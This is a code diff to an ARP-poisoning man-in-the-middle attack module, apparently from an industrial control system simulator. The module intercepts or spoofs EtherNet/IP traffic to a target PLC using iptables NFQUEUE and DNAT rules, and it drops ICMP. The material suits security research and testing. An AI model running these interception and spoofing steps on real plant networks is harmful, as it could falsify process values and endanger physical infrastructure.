+++ dhalsim/network_attacks/mitm_attack.py
@@ -1,26 +1,26 @@
 import argparse
 import os
-import subprocess
-import threading
-import time
 from pathlib import Path
-from typing import List
 
 from dhalsim.network_attacks.utilities import launch_arp_poison, restore_arp
 from dhalsim.network_attacks.synced_attack import SyncedAttack
 
+import subprocess
+import sys
+import signal
 
-class MitmAttack(SyncedAttack):
+
+class Error(Exception):
+    """Base class for exceptions in this module."""
+
+
+class DirectionError(Error):
+    """Raised when the optional parameter direction does not have source or destination as value"""
+
+
+class MiTMAttack(SyncedAttack):
     """
-    This is a Man In The Middle attack. This attack will respond to request for
-    the target PLC.
-
-    It does this by starting its own CPPPO server, and replying to the request with its
-    own value. It also uses CPPPO to request the real values from the target PLC.
-
-    When preforming this attack, you can use either an offset, or an absolute value.
-
-    When using this type of attack, you can modify the values of individual tags.
+    todo
 
     :param intermediate_yaml_path: The path to the intermediate YAML file
     :param yaml_index: The index of the attack in the intermediate YAML
@@ -29,49 +29,37 @@ class MitmAttack(SyncedAttack):
     def __init__(self, intermediate_yaml_path: Path, yaml_index: int):
         super().__init__(intermediate_yaml_path, yaml_index)
         os.system('sysctl net.ipv4.ip_forward=1')
-        self.thread = None
-        self.server = None
-        self.run_thread = False
-        self.tags = {}
-        self.dict_lock = threading.Lock()
+
+        # Process object to handle nfqueue
+        self.nfqueue_process = None
+        self.attacked_tag = self.intermediate_attack['tag']
 
     def setup(self):
         """
         This function start the network attack.
 
-        It first sets up the iptables on the attacker node route the packets that orignally
-        where for the target PLC, to the attacker.
-        It also drops the icmp packets, to avoid network packets skipping the
+        It first sets up the iptables on the attacker node to capture the tcp packets coming from
+        the target PLC. It also drops the icmp packets, to avoid network packets skipping the
         attacker node.
 
         Afterwards it launches the ARP poison, which basically tells the network that the attacker
         is the PLC, and it tells the PLC that the attacker is the router.
 
-        Finally, it launches the thread that will respond to the CPPPO requests.
+        Finally, it launches the thread that will examine all captured packets.
         """
-        os.system('iptables -t nat -A PREROUTING -p tcp -d ' + self.target_plc_ip +
-                  ' --dport 44818 -j DNAT --to-destination ' + self.attacker_ip + ':44818')
+        if self.direction == 'source':
+            os.system(f'iptables -t mangle -A PREROUTING -p tcp --sport 44818 -s {self.target_plc_ip} -j NFQUEUE '
+                      f'--queue-num 1')
+        elif self.direction == 'destination':
+            os.system(f'iptables -t mangle -A PREROUTING -p tcp --sport 44818 -d {self.target_plc_ip} -j NFQUEUE '
+                      f'--queue-num 1 ')
+        else:
+            self.logger.error('Wrong direction configured, direction must be source or destination')
+            raise DirectionError('Wrong direction configured')
+
         os.system('iptables -A FORWARD -p icmp -j DROP')
         os.system('iptables -A INPUT -p icmp -j DROP')
         os.system('iptables -A OUTPUT -p icmp -j DROP')
-
-        cmd = ['/usr/bin/python2', '-m', 'cpppo.server.enip', '--print', '--address',
-               self.attacker_ip + ":44818"]
-
-        request_tags = self.intermediate_plc['actuators'] + self.intermediate_plc['sensors']
-        for tag in request_tags:
-            cmd.append(str(tag) + ':1=REAL')
-
-        self.logger.debug(f"MITM Attack server: {cmd}")
-
-        self.server = subprocess.Popen(cmd, shell=False)
-
-        self.run_thread = True
-
-        self.update_tags_dict()
-
-        self.thread = threading.Thread(target=self.cpppo_thread)
-        self.thread.start()
 
         # Launch the ARP poison by sending the required ARP network packets
         launch_arp_poison(self.target_plc_ip, self.intermediate_attack['gateway_ip'])
@@ -80,96 +68,14 @@ class MitmAttack(SyncedAttack):
                 if plc['name'] != self.intermediate_plc['name']:
                     launch_arp_poison(self.target_plc_ip, plc['local_ip'])
 
-        self.logger.debug(f"MITM Attack ARP Poison between {self.target_plc_ip} and "
+        self.logger.debug(f"Naive MITM Attack ARP Poison between {self.target_plc_ip} and "
                           f"{self.intermediate_attack['gateway_ip']}")
 
-    def receive_original_tags(self):
-        """Update the :code:`tags` dict to the newest original values from the target PLC"""
-        request_tags = self.intermediate_plc['actuators'] + self.intermediate_plc['sensors']
+        queue_number = 1
+        nfqueue_path = Path(__file__).parent.absolute() / "mitm_netfilter_queue.py"
+        cmd = ["python3", str(nfqueue_path), str(self.intermediate_yaml_path), str(self.yaml_index), str(queue_number)]
 
-        cmd = ['/usr/bin/python2', '-m', 'cpppo.server.enip.client', '--print', '--address',
-               str(self.target_plc_ip) + ":44818"]
-
-        for tag in request_tags:
-            cmd.append(str(tag) + ':1')
-
-        try:
-            client = subprocess.Popen(cmd, shell=False, stdout=subprocess.PIPE)
-
-            # client.communicate is blocking
-            raw_out = client.communicate()
-
-            # Value is stored as first tuple element between a pair of square brackets
-            values = []
-            raw_string = raw_out[0]
-            split_string = raw_string.split(b"\n")
-            for word in split_string:
-                values.append(word[(word.find(b'[') + 1):word.find(b']')])
-            values.pop()
-
-            for idx, value in enumerate(values):
-                self.tags[request_tags[idx]] = float(value.decode())
-
-        except Exception as error:
-            self.logger.error(f"ERROR MITM Attack ENIP send_multiple: {error}")
-
-    def update_tags_dict(self):
-        """
-        Update the :code:`tags` dict to the original values from the target PLC,
-        and then overwrite them with the fake values and offsets.
-        """
-        # Acquire the lock
-        self.dict_lock.acquire()
-
-        self.receive_original_tags()
-
-        # Overwrites the tags that we are spoofing
-        for tag in self.intermediate_attack['tags']:
-            if 'value' in tag.keys():
-                # Overwrite the value in the dict
-                self.tags[tag['tag']] = tag['value']
-            elif 'offset' in tag.keys():
-                # Offset the value in the dict
-                self.tags[tag['tag']] += tag['offset']
-
-        # Release the lock
-        self.dict_lock.release()
-
-    def make_client_cmd(self) -> List[str]:
-        """
-        Put all the tags together into a command that starts CPPPO and responds to request.
-
-        :return: The command that starts the CPPPO client
-        :rtype: List[str]
-        """
-        cmd = ['/usr/bin/python2', '-m', 'cpppo.server.enip.client', '--print', '--address',
-               str(self.attacker_ip)]
-
-        # Acquire the lock
-        self.dict_lock.acquire()
-
-        for tag in self.tags:
-            cmd.append(str(tag) + ':1=' + str(self.tags[tag]))
-
-        # Release the lock
-        self.dict_lock.release()
-
-        return cmd
-
-    def cpppo_thread(self, interrupt_test=False):
-        """Start the CPPPO client to respond to requests."""
-        while self.run_thread:
-            cmd = self.make_client_cmd()
-            self.logger.debug(f"MITM Attack Client: {cmd}")
-
-            try:
-                client = subprocess.Popen(cmd, shell=False)
-                client.wait()
-            except Exception as error:
-                self.logger.error(f"ERROR MITM Attack client ENIP send_multiple: {error}")
-            if interrupt_test:
-                break
-            time.sleep(0.05)
+        self.nfqueue_process = subprocess.Popen(cmd, shell=False, stderr=sys.stderr, stdout=sys.stdout)
 
     def interrupt(self):
         """
@@ -192,24 +98,34 @@ class MitmAttack(SyncedAttack):
                 if plc['name'] != self.intermediate_plc['name']:
                     restore_arp(self.target_plc_ip, plc['local_ip'])
 
-        self.logger.debug(f"MITM Attack ARP Restore between {self.target_plc_ip} and "
+        self.logger.debug(f"Naive MITM Attack ARP Restore between {self.target_plc_ip} and "
                           f"{self.intermediate_attack['gateway_ip']}")
 
-        # Delete iptables rules
-        os.system('iptables -t nat -D PREROUTING -p tcp -d ' + self.target_plc_ip +
-                  ' --dport 44818 -j DNAT --to-destination ' + self.attacker_ip + ':44818')
+
+        if self.direction == 'source':
+            os.system(f'iptables -t mangle -D PREROUTING -p tcp --sport 44818 -s {self.target_plc_ip} -j NFQUEUE '
+                      f'--queue-num 1')
+        elif self.direction == 'destination':
+            os.system(f'iptables -t mangle -D PREROUTING -p tcp --sport 44818 -d {self.target_plc_ip} -j NFQUEUE '
+                      f'--queue-num 1 ')
+
         os.system('iptables -D FORWARD -p icmp -j DROP')
         os.system('iptables -D INPUT -p icmp -j DROP')
         os.system('iptables -D OUTPUT -p icmp -j DROP')
 
-        self.server.terminate()
-        self.run_thread = False
-        self.thread.join()
+        self.logger.debug(f"Restored ARP")
+
+        self.logger.debug("Stopping nfqueue subprocess...")
+        self.nfqueue_process.send_signal(signal.SIGINT)
+        self.nfqueue_process.wait()
+        if self.nfqueue_process.poll() is None:
+            self.nfqueue_process.terminate()
+        if self.nfqueue_process.poll() is None:
+            self.nfqueue_process.kill()
 
     def attack_step(self):
-        """When the attack is running, it will update the tags dict with the most recent values."""
-        if self.state == 1:
-            self.update_tags_dict()
+        """Polls the NetFilterQueue subprocess and sends a signal to stop it when teardown is called"""
+        pass
 
 
 def is_valid_file(parser_instance, arg):
@@ -231,7 +147,7 @@ if __name__ == "__main__":
 
     args = parser.parse_args()
 
-    attack = MitmAttack(
+    attack = MiTMAttack(
         intermediate_yaml_path=Path(args.intermediate_yaml),
         yaml_index=args.index)
     attack.main_loop()
